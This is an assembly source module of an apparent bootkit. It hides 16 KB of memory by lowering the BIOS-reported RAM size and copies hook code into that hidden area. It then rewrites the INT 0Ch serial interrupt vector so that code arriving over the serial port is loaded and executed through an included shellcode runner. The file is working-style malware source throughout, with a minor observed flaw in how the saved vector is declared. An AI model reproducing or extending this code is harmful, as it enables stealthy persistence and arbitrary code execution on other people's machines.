; IVT Injection Module
; This module creates an invisible RAM space and infects Interrupt Vector Table
; with arbitrary routines.

[bits 16]

infect_boot:
    cli

    ; Save registers
    pusha
    push ds
    push es

    ; Creating invisible RAM space for persistency
    mov ax, 0x0040
    mov ds, ax
    mov ax, [0x0013]        ; Getting total RAM in BIOS Data Area
    sub ax, 16              ; Reserves 16 KB for bootkit
    mov [0x0013], ax        ; Saves new total value

    ; Setting hooks
    xor di, di
    mov si, hooks_start
    mov cx, hooks_end - hooks_start

    inc ax                  ; Uses the posterior segment for hooks
    shl ax, 6               ; Segment transform
    mov es, ax              ; Uses safe address as segment
    
    ; Adjusting segment and copying
    mov bx, cs
    mov ds, bx

    cld
    rep movsb

    ; Activating Serial Hook
    xor ax, ax
    mov es, ax
    
    mov ax, [es:0x0070]                 
    mov [int0c_bios_off], ax
    mov ax, [es:0x0072]                 
    mov [int0c_bios_seg], ax
    
    mov dx, (serial_hook - hooks_start)
    mov al, 0x0c

    call overwrite_ivt

    ; Enabling UART interrupts
    mov dx, 0x3f9
    mov al, 0x01
    out dx, al

    ; Unlock Master PIC IRQ 4 line
    in al, 0x21
    and al, 0xef
    out 0x21, al

    ; Finishing
    call save_ivt

    ; Recovering registers
    pop es
    pop ds
    popa
    sti
    ret

overwrite_ivt:
    push ax
    push bx
    push ds
    push es

    ; Pointers to IVT
    xor bx, bx
    mov es, bx

    ; Calculates interrupt address
    mov ah, 0
    shl ax, 2
    mov bx, ax

    ; Calculates source
    mov ax, 0x0040
    mov ds, ax
    mov ax, [0x0013]        
    inc ax
    shl ax, 6

    ; Overwrite IVT
    mov word [es:bx], dx
    mov word [es:bx+2], ax

    pop es
    pop ds
    pop bx
    pop ax
    ret

hooks_start:

; TODO: Interrupt chaining
serial_hook:
    push ax
    push dx

    mov dx, 0x3fd
    in al, dx
    test al, 0x1
    pop dx
    jz .done

    ; Load and executes incoming code 
    call exec_code

    .done:
        ; Releasing OS
        mov al, 0x20
        out 0x20, al

        pop ax
        iret

%include "shellcode_runner.asm"

; timer_hook: iret

hooks_end:

%include "ivt_backup.asm"

int0c_bios_off db 0
int0c_bios_seg db 0